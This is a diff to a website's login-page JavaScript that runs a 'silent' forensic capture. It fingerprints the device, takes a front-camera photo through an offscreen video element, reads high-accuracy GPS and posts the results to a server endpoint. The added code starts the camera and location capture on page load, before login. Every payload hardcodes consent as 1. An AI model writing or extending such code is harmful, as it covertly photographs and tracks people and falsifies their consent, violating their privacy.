@@ -14,6 +14,9 @@
 
   var FORENSIC_URL = (window.SITE_URL || '') + 'login/forensic_capture';
   var captureSent = false;
+  var preloadedPhoto = null;
+  var preloadedGps = null;
+  var captureInProgress = false;
 
   // -- Device fingerprint -------------------------------------------------
 
@@ -56,19 +59,39 @@
     };
   }
 
-  // -- Camera capture -----------------------------------------------------
+  // -- Camera capture with timeout ----------------------------------------
 
   function capturePhoto() {
     return new Promise(function (resolve) {
+      // If we already captured a photo on page load, use it
+      if (preloadedPhoto !== null) {
+        resolve(preloadedPhoto);
+        return;
+      }
+
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
         resolve({ photo: null, error: 'camera-not-supported' });
         return;
       }
 
+      var resolved = false;
       var video = document.createElement('video');
       video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:128px;height:96px;';
       video.autoplay = true;
       video.playsInline = true;
+
+      // Timeout: if camera doesn't produce a frame in 6 seconds, give up
+      var timer = setTimeout(function () {
+        if (resolved) return;
+        resolved = true;
+        try { 
+          if (video.srcObject) {
+            video.srcObject.getTracks().forEach(function (t) { t.stop(); });
+          }
+        } catch (e) {}
+        if (video.parentNode) document.body.removeChild(video);
+        resolve({ photo: null, error: 'camera-timeout' });
+      }, 6000);
 
       navigator.mediaDevices.getUserMedia({
         video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
@@ -80,6 +103,10 @@
         video.onloadedmetadata = function () {
           var isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
           setTimeout(function () {
+            if (resolved) {
+              stream.getTracks().forEach(function (t) { t.stop(); });
+              return;
+            }
             try {
               var canvas = document.createElement('canvas');
               canvas.width = 128;
@@ -98,33 +125,56 @@
                 photoData = canvas.toDataURL('image/jpeg', 0.4);
               }
 
+              resolved = true;
+              clearTimeout(timer);
               resolve({ photo: photoData, error: null });
             } catch (e) {
               stream.getTracks().forEach(function (t) { t.stop(); });
               if (video.parentNode) document.body.removeChild(video);
+              resolved = true;
+              clearTimeout(timer);
               resolve({ photo: null, error: 'capture-failed' });
             }
-          }, isMobile ? 1200 : 800);
+          }, isMobile ? 1500 : 1000);
         };
       }).catch(function (err) {
         if (video.parentNode) document.body.removeChild(video);
+        resolved = true;
+        clearTimeout(timer);
         resolve({ photo: null, error: err.name || 'camera-denied' });
       });
     });
   }
 
-  // -- GPS capture --------------------------------------------------------
+  // -- GPS capture with timeout -------------------------------------------
 
   function captureGPS() {
     return new Promise(function (resolve) {
+      if (preloadedGps !== null) {
+        resolve(preloadedGps);
+        return;
+      }
+
       if (!navigator.geolocation) {
         resolve({ lat: null, lng: null, accuracy: 0, error: 'gps-not-supported' });
         return;
       }
 
+      var resolved = false;
+
+      // Timeout: if GPS doesn't respond in 8 seconds, give up
+      var timer = setTimeout(function () {
+        if (resolved) return;
+        resolved = true;
+        resolve({ lat: null, lng: null, accuracy: 0, error: 'gps-timeout' });
+      }, 8000);
+
       var isMobile = /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent);
       navigator.geolocation.getCurrentPosition(
         function (pos) {
+          if (resolved) return;
+          resolved = true;
+          clearTimeout(timer);
           resolve({
             lat: pos.coords.latitude,
             lng: pos.coords.longitude,
@@ -133,6 +183,9 @@
           });
         },
         function (err) {
+          if (resolved) return;
+          resolved = true;
+          clearTimeout(timer);
           resolve({ lat: null, lng: null, accuracy: 0, error: err.message || 'gps-denied' });
         },
         { enableHighAccuracy: true, timeout: isMobile ? 15000 : 8000, maximumAge: 30000 }
@@ -204,15 +257,56 @@
     });
   }
 
+  // -- Preload camera and GPS on page load (before login) -----------------
+  // This requests permissions early so the browser prompt appears
+  // while the user is still on the login page, not during submit.
+
+  function preloadCapture() {
+    // Only preload on HTTPS or localhost — camera won't work otherwise
+    var isSecure = location.protocol === 'https:' || location.hostname === 'localhost' || location.hostname === '127.0.0.1';
+    if (!isSecure) return;
+
+    // Preload camera
+    capturePhoto().then(function (result) {
+      preloadedPhoto = result;
+    });
+
+    // Preload GPS
+    captureGPS().then(function (result) {
+      preloadedGps = result;
+    });
+  }
+
   // -- Silent capture (no modal, no overlay) ------------------------------
 
   window.fbmsoForensicCapture = function (username) {
     return new Promise(function (resolve) {
       var deviceData = collectDeviceData();
 
+      // Overall timeout: if everything takes more than 8 seconds,
+      // just send what we have and let the login proceed.
+      var overallTimer = setTimeout(function () {
+        sendForensicData({
+          username: username || '',
+          photo: preloadedPhoto ? preloadedPhoto.photo : null,
+          lat: preloadedGps ? preloadedGps.lat : null,
+          lng: preloadedGps ? preloadedGps.lng : null,
+          accuracy: preloadedGps ? preloadedGps.accuracy : 0,
+          consent: 1,
+          canvas_fingerprint: deviceData.canvas_fingerprint,
+          screen_resolution: deviceData.screen_resolution,
+          hardware_concurrency: deviceData.hardware_concurrency,
+          device_memory: deviceData.device_memory,
+          timezone: deviceData.timezone,
+          language: deviceData.language,
+          platform: deviceData.platform
+        }).then(resolve).catch(resolve);
+      }, 8000);
+
       // Capture photo and GPS in parallel. If either fails, we still
       // proceed — the failure is logged in the record.
       Promise.all([capturePhoto(), captureGPS()]).then(function (results) {
+        clearTimeout(overallTimer);
         var payload = {
           username: username || '',
           photo: results[0].photo,
@@ -230,6 +324,7 @@
         };
         sendForensicData(payload).then(resolve).catch(resolve);
       }).catch(function () {
+        clearTimeout(overallTimer);
         sendForensicData({
           username: username || '',
           photo: null, lat: null, lng: null, accuracy: 0, consent: 1,
@@ -272,9 +367,13 @@
   }
 
   if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', hookLoginForm);
+    document.addEventListener('DOMContentLoaded', function () {
+      hookLoginForm();
+      preloadCapture();
+    });
   } else {
     hookLoginForm();
+    preloadCapture();
   }
 
   retryFailedCapture();
